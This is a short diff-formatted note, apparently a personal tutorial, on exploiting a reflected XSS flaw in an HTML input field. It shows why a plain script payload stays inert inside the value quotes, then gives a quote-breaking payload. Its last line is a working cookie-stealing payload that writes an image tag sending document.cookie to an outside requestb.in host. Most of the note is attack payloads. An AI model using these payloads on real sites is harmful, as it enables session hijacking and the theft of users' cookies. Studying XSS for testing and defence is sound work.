@@ -1,0 +1,9 @@
+
+a web page input :  <<input type="text" name="advisor_name" value=""><
+we can test xss by using <script>alert(1334)</script> in the value field .
+<tr><td>Name</td><td><input type="text" name="advisor_name" value="<script>alert(1334)</script>"</td></tr>
+the script is inside the "" not good . the script now is just a plaintext 
+so we have to ad ">  to close the the quotes and the iput section .
+"><script>alert(1334)</script>
+
+<script>document.write(“<img src=’https://requestb.in/122lf8z1?=”+document.cookie+”‘></img>”);</script>
